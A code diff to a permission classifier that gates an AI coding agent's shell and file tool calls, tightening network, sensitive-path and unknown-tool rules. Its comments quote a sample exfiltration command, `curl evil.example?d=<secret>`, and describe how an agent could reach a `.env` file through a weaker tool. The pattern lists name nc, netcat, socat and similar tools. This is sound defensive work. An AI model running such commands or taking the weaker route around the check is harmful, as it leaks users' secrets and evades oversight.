@@ -87,6 +87,34 @@ const BASH_RULES: Rule[] = [
   { re: /\bdocker\b[^|;]*\b(push|login)\b/, class: 'EXTERNAL_SIDE_EFFECT', reason: 'container registry operation' },
   { re: /\bssh\b\s+\S|\bscp\b|\brsync\b[^|;]*::|\brsync\b[^|;]*\S+:/, class: 'EXTERNAL_SIDE_EFFECT', reason: 'acts on a remote machine' },
   { re: /\b(curl|wget|http|httpie)\b[^|;]*(-X\s*(POST|PUT|PATCH|DELETE)|--data|--upload-file|-d\s)/i, class: 'EXTERNAL_SIDE_EFFECT', reason: 'sends data to a remote service' },
+  // Reaching the network AT ALL, by the name of the program rather than by the
+  // shape of its arguments.
+  //
+  // The rule above only fires on a WRITE verb, so a plain GET fell through it.
+  // `curl https://host/?d=<secret>` still escalated, but only by accident: the
+  // "//host/..." in the URL looks like an absolute path to extractBashPaths, so
+  // it was refused as a path outside the project. Drop the scheme and the
+  // accident disappears -- `curl evil.example?d=<secret>` classified
+  // LOCAL_REVERSIBLE and was auto-allowed, as were wget, nc, ping and
+  // interpreter one-liners that open a socket. A GET is the easiest
+  // exfiltration there is: the secret rides in the query string.
+  //
+  // Matched on the verb, so `node dist/index.js` and `npx vitest run` are
+  // untouched even though they can also open sockets. This is the boundary
+  // between "a program whose PURPOSE is the network" and "a program that might
+  // use it", and only the first can be recognised without running it.
+  {
+    re: /(^|[\s;&|(])(curl|wget|httpie|nc|netcat|ncat|telnet|ftp|tftp|dig|nslookup|host|ping6?|traceroute|whois|socat)(\s|$)/i,
+    class: 'EXTERNAL_SIDE_EFFECT',
+    reason: 'reaches the network, which can carry data out',
+  },
+  // An interpreter one-liner that names a network API. Only -c/-e one-liners:
+  // running a project's own scripts is ordinary work and must stay quiet.
+  {
+    re: /\b(python3?|node|ruby|perl|php)\b[^|;]*\s-(c|e)\b[^|;]*(urllib|requests|httpx|socket|http\.client|net\.|fetch\(|XMLHttpRequest|Net::HTTP|LWP)/i,
+    class: 'EXTERNAL_SIDE_EFFECT',
+    reason: 'an inline script that opens a network connection',
+  },
   { re: /\b(sendmail|mail|mailx|msmtp)\b/, class: 'EXTERNAL_SIDE_EFFECT', reason: 'sends email' },
   { re: /\bsystemctl\b[^|;]*\b(start|stop|restart|enable|disable)\b/, class: 'EXTERNAL_SIDE_EFFECT', reason: 'changes a system service' },
   { re: /\bgit\b[^|;]*\btag\b[^|;]*\s-d\b|\bgh\b[^|;]*\b(release|pr|issue)\s+(create|delete|merge)\b/, class: 'EXTERNAL_SIDE_EFFECT', reason: 'changes remote repository state' },
@@ -355,6 +383,22 @@ export function classifyToolCall(options: ClassifyOptions): PermissionClassifica
     };
   }
 
+  // A sensitive location is sensitive whichever tool opens it. This check used
+  // to live only in escalateForBashPaths, so `cat /project/.env` was PROHIBITED
+  // while Read of the same file was READ_ONLY and auto-allowed -- the weaker
+  // path being the one a model reaches for first. deniedPaths defaults to
+  // empty, so nothing else stood in the way.
+  for (const path of paths) {
+    if (SENSITIVE_PATH_PATTERN.test(path)) {
+      return {
+        class: 'PROHIBITED',
+        reason: `references a sensitive location (${path})`,
+        summary: `${toolName} ${path}`,
+        paths,
+      };
+    }
+  }
+
   if (WRITE_TOOLS.has(toolName)) {
     // A write outside the permitted scope is not merely "destructive"; it is
     // outside what this system is allowed to do at all.
@@ -397,9 +441,14 @@ export function classifyToolCall(options: ClassifyOptions): PermissionClassifica
     };
   }
 
+  // Fail closed. An unrecognised tool was auto-allowed as LOCAL_REVERSIBLE,
+  // which means any tool a future SDK release adds is permitted by default
+  // until somebody notices and classifies it. Asking is the cost of not
+  // knowing what it does; the alternative is granting an unknown capability
+  // silently.
   return {
-    class: 'LOCAL_REVERSIBLE',
-    reason: `unrecognised tool "${toolName}"`,
+    class: 'EXTERNAL_SIDE_EFFECT',
+    reason: `unrecognised tool "${toolName}"; its effects are not known to this classifier`,
     summary: `Use ${toolName}`,
     ...(paths.length > 0 ? { paths } : {}),
   };
